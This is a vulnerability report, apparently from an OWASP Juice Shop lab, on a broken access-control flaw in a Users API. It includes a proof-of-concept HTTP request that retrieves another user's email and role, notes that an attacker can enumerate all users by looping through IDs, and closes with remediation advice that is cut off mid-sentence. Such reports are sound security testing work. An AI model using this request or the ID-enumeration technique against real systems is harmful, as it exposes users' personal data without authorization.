**Category:** #a1_broken_access_control #a5_security_misconfiguration  

---

## Overview
The **Users API** exposes sensitive user information and does not enforce proper **access control checks**.  
Any authenticated user can supply an arbitrary **user ID** to retrieve details of other users, including email addresses and roles.  

---
## Proof of Concept  

### Request
```http
GET /api/Users/3 HTTP/1.1
Host: localhost:3000
Authorization: Bearer <valid_token>
```

### Response
```json
{
  "status": "success",
  "data": {
    "id": 3,
    "username": "",
    "email": "bender@juice-sh.op",
    "role": "customer",
    "deluxeToken": "",
    "lastLoginIp": "",
    "profileImage": "assets/public//images/uploads/default.svg",
    "isActive": true,
    "createdAt": "2025-08-10T14:20:03.249Z",
    "updatedAt": "2025-08-10T14:20:03.249Z",
    "deletedAt": null
  }
}
```

- The attacker requested `/api/Users/3` and successfully obtained **personal data** for another user.  
- No **authorization check** was performed to confirm ownership.  

---
## Impact
- **User enumeration:** An attacker can loop through IDs to retrieve all registered users.  
- **Information disclosure:** Email addresses, roles, and account states are leaked.  
- **Targeted attacks:** Exposed information may be used for phishing, social engineering, or privilege escalation.  

**Severity:** High  

---
## Recommendations
1. **Enforce Authorization:** Ensure users can only access **their own profile** unless explicitly authorized (e.g., admins).  
2. **Use Access Control Middleware:** Apply ownership checks at the controller/service level.  
3. **Restrict Data Exposure:** Return only the fields strictly necessary (e
